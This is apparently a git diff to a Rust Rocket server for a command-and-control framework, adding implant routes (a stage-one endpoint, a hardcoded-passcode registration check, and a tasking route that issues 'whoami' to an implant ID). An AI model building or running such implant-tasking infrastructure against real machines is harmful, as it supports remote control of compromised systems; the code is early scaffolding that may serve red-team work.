@@ -14,16 +14,14 @@ use rocket::{
     request::{ self, FromRequest },
     fairing::{ AdHoc },
     response::{ Debug, status::Created, stream::{EventStream, Event} },
-    serde::{ Serialize, Deserialize, json::Json, ser::{SerializeSeq, SerializeStruct}, Serializer },
+    serde::{ Serialize, Deserialize, json::Json, ser::{SerializeSeq}, Serializer },
     form::{ Form },
-    outcome::{Outcome},
     fs::{relative, FileServer,},
     Rocket,
     Build,
-    Error,
     FromForm,
     Request,
-    State, time::{OffsetDateTime, macros::{datetime, date}, Date}, tokio::{net::{TcpListener, unix::SocketAddr,}, sync::broadcast::{Sender, error::RecvError, channel}, select}, Shutdown,
+    State, time::{OffsetDateTime, macros::{datetime, date}, Date}, tokio::{net::{TcpListener}, sync::broadcast::{Sender, error::RecvError, channel}, select}, Shutdown,
 };
 
 use std::{
@@ -34,7 +32,7 @@ use diesel::{
     prelude::*,
     Queryable,
     self,
-    Identifiable, query_dsl::methods::FilterDsl, associations::HasTable,
+    Identifiable,
 };
 
 use crate::{schema::{agents}, api_models::{ListenerModel, Message}};
@@ -139,20 +137,6 @@ impl Serialize for C2Tasks {
     }
 }
 
-
-//#[derive(Debug, Clone, Queryable)]
-//#[table_name = "errands"]
-//pub struct Errand {
-//    pub id: i32,
-//    pub created_at: DateTime<Utc>,
-//    pub executed_at: Option<DateTime<Utc>>,
-//    pub command: String,
-//    pub args: Json<Vec<String>>,
-//    pub output: Option<String>,
-//
-//    pub agent_id: String,
-//}
-
 #[derive(Debug, Queryable, AsChangeset, FromForm, Serialize, Deserialize, Identifiable)]
 #[table_name = "agents"]
 pub struct AgentModel {
@@ -183,6 +167,8 @@ impl Agent {
         agents::table.order(agents::id.desc()).first(connection)
     }
 
+
+
     //pub fn get_by_agent_id_and_pid(agent_id_: String, password_: String, connection: &//mut PgConnection) -> Option<Agent> {
     //    let res = agents::table
     //        .filter(agents::agent_id.eq(agent_id_))
@@ -212,6 +198,11 @@ impl Agent {
     //}
 }
 
+#[derive(Debug, Clone, Deserialize, Serialize, FromForm)]
+pub struct OTPasscode {
+    pub passcode: String,
+}
+
 // TESTING
 
 #[get("/")]
@@ -226,8 +217,8 @@ fn test() -> &'static str {
 
 #[get("/checking")]
 fn apply() -> Json<InsertableAgent> {
-    let agent_id = "HAHAHA".to_string();
-    let agent_pid = "4123".to_string();
+    let agent_id = "test".to_string();
+    let agent_pid = "1234".to_string();
     let agent_ip = "127.0.0.1".to_string();
 
     Json(InsertableAgent { agent_id, agent_pid, agent_ip })
@@ -349,6 +340,48 @@ fn c2_users(id: &C2Client) -> Json<usize> {
 
 
 
+// implant routes
+
+#[get("/stage-one")]
+fn stage_one() -> Json<String> {
+    let _x = String::from("TESTING IMPLANT");
+    return Json(_x)
+}
+
+//TODO: Make this actually secure
+#[post("/otp-reg", data="<otp>")]
+fn otp_reg(otp: Form<OTPasscode>) -> Status {
+    let shh = otp.into_inner();
+
+    let eval = String::from(shh.passcode);
+    
+    if eval == String::from("henfcv*##&bfsx") {
+        Status::Accepted
+    } else {
+        Status::NotFound
+    }
+}
+
+#[post("/new/task", data="<new_task>")]
+fn test_fetch_task(new_task: Form<NewC2Task>) -> Json<NewC2Task> {
+    let _res = new_task.into_inner();
+    Json( NewC2Task { 
+        task: (_res.task), 
+        args: (_res.args), 
+        implant_id: (_res.implant_id) })
+}
+
+#[get("/new/tasks")]
+fn test_fetch_commands() -> Json<NewC2Task> {
+    //let _res = new_task.into_inner();
+    let _args = Vec::new();
+    Json( NewC2Task { 
+        task: (String::from("whoami")), 
+        args: (_args), 
+        implant_id: (String::from("MG7RF6")) 
+    })
+}
+
 
 // END OF TESTING
 
@@ -434,8 +467,6 @@ pub fn stage() -> AdHoc {
             .mount("/api", routes![
                 // opsec
                 index,
-                test,
-                apply,
                 test_reg,
                 // implant handling
                 register_agent,
@@ -450,6 +481,9 @@ pub fn stage() -> AdHoc {
                 events,
                 post_message,
                 c2_users,
+                stage_one,
+                otp_reg,
+                test_fetch_commands,
 
             ]
         )
